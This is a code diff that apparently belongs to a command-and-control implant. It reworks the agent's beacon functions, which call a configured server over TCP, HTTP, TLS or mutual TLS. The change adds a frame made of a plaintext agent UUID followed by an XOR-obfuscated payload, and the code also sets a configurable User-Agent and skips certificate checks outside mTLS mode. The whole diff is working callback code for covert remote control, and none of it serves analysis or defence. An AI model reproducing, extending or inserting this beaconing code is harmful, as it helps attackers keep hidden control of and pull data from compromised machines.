@@ -7,7 +7,7 @@
 #ifdef _WIN32
     #include <winsock2.h>
     typedef SOCKET NetSock;
-    #define SockInvalid INVALID_SOCKET
+    #define SockInvalid  INVALID_SOCKET
     #define SockClose(s) closesocket(s)
 #else
     #include <arpa/inet.h>
@@ -15,7 +15,7 @@
     #include <sys/socket.h>
     #include <unistd.h>
     typedef int NetSock;
-    #define SockInvalid (-1)
+    #define SockInvalid  (-1)
     #define SockClose(s) close(s)
 #endif
 
@@ -46,15 +46,38 @@ static NetSock TcpDial(const char *Host, int Port)
     return S;
 }
 
-static int BeaconTcp(const AgentConfig *C, const char *Send, char *Recv)
+/*
+ * Wire format: "<UUID>|<XOR-encrypted payload>"
+ * UUID is sent in plaintext (36 bytes + '|') so the server can
+ * identify the agent regardless of source port.
+ * Only the payload after '|' is XOR-encrypted.
+ */
+static int BuildFrame(const char *Uuid, const char *Payload,
+                      char *Out, size_t *OutLen)
+{
+    size_t PLen = strlen(Payload);
+    size_t Total = 37 + PLen;
+    if (Total >= BufSize) return 0;
+
+    memcpy(Out, Uuid, 36);
+    Out[36] = '|';
+    memcpy(Out + 37, Payload, PLen);
+    ApplyXor(Out + 37, PLen);
+    *OutLen = Total;
+    return 1;
+}
+
+static int BeaconTcp(const AgentConfig *C, const char *Uuid,
+                     const char *Payload, char *Recv)
 {
     NetSock S = TcpDial(C->Host, C->Port);
     if (S == SockInvalid) return 0;
-    char Enc[BufSize];
-    size_t Len = strlen(Send);
-    memcpy(Enc, Send, Len);
-    ApplyXor(Enc, Len);
-    send(S, Enc, (int)Len, 0);
+
+    char Frame[BufSize];
+    size_t FLen;
+    if (!BuildFrame(Uuid, Payload, Frame, &FLen)) { SockClose(S); return 0; }
+    send(S, Frame, (int)FLen, 0);
+
     int N = recv(S, Recv, BufSize - 1, 0);
     SockClose(S);
     if (N <= 0) return 0;
@@ -63,15 +86,15 @@ static int BeaconTcp(const AgentConfig *C, const char *Send, char *Recv)
     return 1;
 }
 
-static int BeaconHttp(const AgentConfig *C, const char *Send, char *Recv)
+static int BeaconHttp(const AgentConfig *C, const char *Uuid,
+                      const char *Payload, char *Recv)
 {
     NetSock S = TcpDial(C->Host, C->Port);
     if (S == SockInvalid) return 0;
 
-    char Body[BufSize];
-    size_t BLen = strlen(Send);
-    memcpy(Body, Send, BLen);
-    ApplyXor(Body, BLen);
+    char Frame[BufSize];
+    size_t FLen;
+    if (!BuildFrame(Uuid, Payload, Frame, &FLen)) { SockClose(S); return 0; }
 
     char Req[BufSize];
     int RLen = snprintf(Req, BufSize,
@@ -82,21 +105,22 @@ static int BeaconHttp(const AgentConfig *C, const char *Send, char *Recv)
                         "Content-Length: %d\r\n"
                         "Connection: close\r\n"
                         "\r\n",
-                        C->HttpPath, C->Host, C->Port, C->UserAgent, (int)BLen);
+                        C->HttpPath, C->Host, C->Port,
+                        C->UserAgent, (int)FLen);
     send(S, Req, RLen, 0);
-    send(S, Body, (int)BLen, 0);
+    send(S, Frame, (int)FLen, 0);
 
     char Raw[BufSize] = {0};
     int N = recv(S, Raw, BufSize - 1, 0);
     SockClose(S);
     if (N <= 0) return 0;
 
-    char *RespBody = strstr(Raw, "\r\n\r\n");
-    if (!RespBody) return 0;
-    RespBody += 4;
-    int RL = N - (int)(RespBody - Raw);
+    char *Body = strstr(Raw, "\r\n\r\n");
+    if (!Body) return 0;
+    Body += 4;
+    int RL = N - (int)(Body - Raw);
     if (RL <= 0) return 0;
-    memcpy(Recv, RespBody, (size_t)RL);
+    memcpy(Recv, Body, (size_t)RL);
     Recv[RL] = '\0';
     ApplyXor(Recv, (size_t)RL);
     return 1;
@@ -112,37 +136,31 @@ static SSL_CTX *TlsBuildCtx(const AgentConfig *C)
         SSL_load_error_strings();
         SslInit = 1;
     }
-
     SSL_CTX *Ctx = SSL_CTX_new(TLS_client_method());
     if (!Ctx) return NULL;
     SSL_CTX_set_min_proto_version(Ctx, TLS1_2_VERSION);
-
     if (C->Mode == ModeMtls) {
         if (SSL_CTX_use_certificate_file(Ctx, C->CertFile, SSL_FILETYPE_PEM) <= 0 ||
             SSL_CTX_use_PrivateKey_file(Ctx, C->KeyFile,   SSL_FILETYPE_PEM) <= 0) {
-            ERR_print_errors_fp(stderr);
-            SSL_CTX_free(Ctx); return NULL;
+            ERR_print_errors_fp(stderr); SSL_CTX_free(Ctx); return NULL;
         }
         if (!SSL_CTX_load_verify_locations(Ctx, C->CaFile, NULL)) {
-            ERR_print_errors_fp(stderr);
-            SSL_CTX_free(Ctx); return NULL;
+            ERR_print_errors_fp(stderr); SSL_CTX_free(Ctx); return NULL;
         }
         SSL_CTX_set_verify(Ctx, SSL_VERIFY_PEER, NULL);
     } else {
         SSL_CTX_set_verify(Ctx, SSL_VERIFY_NONE, NULL);
     }
-
     return Ctx;
 }
 
-static int BeaconTls(const AgentConfig *C, const char *Send, char *Recv, int IsHttp)
+static int BeaconTls(const AgentConfig *C, const char *Uuid,
+                     const char *Payload, char *Recv, int IsHttp)
 {
     SSL_CTX *Ctx = TlsBuildCtx(C);
     if (!Ctx) return 0;
-
     int Fd = (int)TcpDial(C->Host, C->Port);
     if (Fd < 0) { SSL_CTX_free(Ctx); return 0; }
-
     SSL *Ssl = SSL_new(Ctx);
     SSL_set_fd(Ssl, Fd);
     SSL_set_tlsext_host_name(Ssl, C->Host);
@@ -150,11 +168,11 @@ static int BeaconTls(const AgentConfig *C, const char *Send, char *Recv, int IsH
     int Ok = 0;
     if (SSL_connect(Ssl) <= 0) { ERR_print_errors_fp(stderr); goto Done; }
 
+    char Frame[BufSize];
+    size_t FLen;
+    if (!BuildFrame(Uuid, Payload, Frame, &FLen)) goto Done;
+
     if (IsHttp) {
-        char Body[BufSize];
-        size_t BLen = strlen(Send);
-        memcpy(Body, Send, BLen);
-        ApplyXor(Body, BLen);
         char Req[BufSize];
         int RLen = snprintf(Req, BufSize,
                             "POST %s HTTP/1.1\r\n"
@@ -164,9 +182,10 @@ static int BeaconTls(const AgentConfig *C, const char *Send, char *Recv, int IsH
                             "Content-Length: %d\r\n"
                             "Connection: close\r\n"
                             "\r\n",
-                            C->HttpPath, C->Host, C->Port, C->UserAgent, (int)BLen);
+                            C->HttpPath, C->Host, C->Port,
+                            C->UserAgent, (int)FLen);
         SSL_write(Ssl, Req, RLen);
-        SSL_write(Ssl, Body, (int)BLen);
+        SSL_write(Ssl, Frame, (int)FLen);
         char Raw[BufSize] = {0};
         int N = SSL_read(Ssl, Raw, BufSize - 1);
         if (N > 0) {
@@ -183,33 +202,29 @@ static int BeaconTls(const AgentConfig *C, const char *Send, char *Recv, int IsH
             }
         }
     } else {
-        char Enc[BufSize];
-        size_t SLen = strlen(Send);
-        memcpy(Enc, Send, SLen);
-        ApplyXor(Enc, SLen);
-        SSL_write(Ssl, Enc, (int)SLen);
+        SSL_write(Ssl, Frame, (int)FLen);
         int N = SSL_read(Ssl, Recv, BufSize - 1);
         if (N > 0) { Recv[N] = '\0'; ApplyXor(Recv, (size_t)N); Ok = 1; }
     }
 
 Done:
-    SSL_shutdown(Ssl);
-    SSL_free(Ssl);
+    SSL_shutdown(Ssl); SSL_free(Ssl);
     SockClose((NetSock)Fd);
     SSL_CTX_free(Ctx);
     return Ok;
 }
 #endif
 
-int BeaconSend(const AgentConfig *C, const char *Payload, char *Response)
+int BeaconSend(const AgentConfig *C, const char *Uuid,
+               const char *Payload, char *Response)
 {
     switch (C->Mode) {
-        case ModeTcp:   return BeaconTcp(C, Payload, Response);
-        case ModeHttp:  return BeaconHttp(C, Payload, Response);
+        case ModeTcp:   return BeaconTcp(C, Uuid, Payload, Response);
+        case ModeHttp:  return BeaconHttp(C, Uuid, Payload, Response);
 #ifdef HaveOpenssl
-        case ModeTls:   return BeaconTls(C, Payload, Response, 0);
-        case ModeHttps: return BeaconTls(C, Payload, Response, 1);
-        case ModeMtls:  return BeaconTls(C, Payload, Response, 0);
+        case ModeTls:   return BeaconTls(C, Uuid, Payload, Response, 0);
+        case ModeHttps: return BeaconTls(C, Uuid, Payload, Response, 1);
+        case ModeMtls:  return BeaconTls(C, Uuid, Payload, Response, 0);
 #endif
         default:        return 0;
     }
